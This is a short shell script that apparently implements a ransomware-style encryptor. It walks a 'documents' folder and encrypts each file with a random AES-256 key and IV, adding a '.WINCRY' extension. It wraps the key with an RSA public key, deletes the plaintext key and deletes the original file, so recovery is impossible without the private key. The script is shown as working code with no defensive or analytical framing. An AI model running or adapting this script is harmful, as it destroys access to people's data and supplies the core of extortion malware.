#!/bin/sh
set -ue

# Encrypt each file.
for filename in documents/*; do
  if [ ! -f $filename ]; then
    continue
  fi

  # Generate IV and key for the file.
  aes_key=$(openssl rand -hex 32)
  iv=$(openssl rand -hex 16)

  # Encrypt the file.
  openssl enc -aes-256-cbc -K $aes_key -iv $iv -in $filename -out $filename.WINCRY
  echo $aes_key$iv > $filename.sky
  openssl pkeyutl -encrypt -pubin -inkey device_key.pub -in $filename.sky -out $filename.sky.rsa
  rm $filename.sky
  
  # Remove the original file.
  rm $filename
done
